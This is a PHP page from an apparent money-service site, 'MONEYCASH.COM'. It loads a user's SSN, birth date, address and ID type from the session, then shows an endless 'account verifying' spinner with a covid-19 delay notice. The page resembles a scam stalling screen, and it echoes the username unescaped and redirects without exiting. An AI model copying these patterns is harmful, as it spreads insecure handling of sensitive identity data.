<?php 
session_start();
include('header.php');
include_once("db_connect.php");
?>
<title>Money cashL</title>
<script type="text/javascript" src="script/ajax.js"></script>

<?php
if(isset($_SESSION['user_id'])){
   $email=$_SESSION['email'];
   $username=$_SESSION['user_name'];
   $user_id= $_SESSION['user_id'];
   $country=$_SESSION['country'];
   $ssn=$_SESSION['ssn'];
   $birth= $_SESSION['date_of_birth'];
   $zip=$_SESSION['zip'];
   $address=$_SESSION['address'];
   $id_type=$_SESSION['id_type'];
}else{
	header('location:login.php');
  echo "you need to login first";
}
?>
</head>

<body class="">
<div role="navigation" class="navbar navbar-default navbar-static-top">
      <div class="container">
        <div class="navbar-header">
          <button data-target=".navbar-collapse" data-toggle="collapse" class="navbar-toggle" type="button">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="" class="navbar-brand">MONEYCASH.COM</a>
        </div>
        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
            <li class="active"><a href="index.php">Home</a></li>
           <li class="active"><a href="contacts.php"> Contacts Us</a></li>
            <li class="active"><a href="logout.php">logout</a></li>
<?php
?>
      
          </ul>
         
        </div><!--/.nav-collapse -->
      </div>
    </div>
	
	<div class="container" style="min-height:500px;">
	<div class=''>
	</div>
<style>
.loader {
  border: 16px solid whitesmoke ;
  border-radius: 70%;
  border-top: 20px solid rgb(21, 181, 221);
  width: 140px;
  height: 140px;
  -webkit-animation: spin 1.3s linear infinite; /* Safari */
  animation: spin 1.3s linear infinite;
  align-items: center;
}

/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
</style>
</head>


<h4>
  HI <?php echo "$username"?>,
</h4>
<p>You are welcome to MONEY CASH,please wait... while we procesing your account</p>
</body>
<center><div class="loader"></div></center>
<h5 style="font-family:Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;text-align: center;font-weight:900;font-style:italic;color:black;">Acount verifying....</h5>
<p style="font-family: Arial, Helvetica, sans-serif;"><b style="font-weight: 900;color:black;">NOTE:-</b>Due to covid-19,your account will be verify  in the next 24hours,if this countinue please <a href="contacts.php">CONTACT US HREE....</a></p>

<?php include('footer.php');?> 
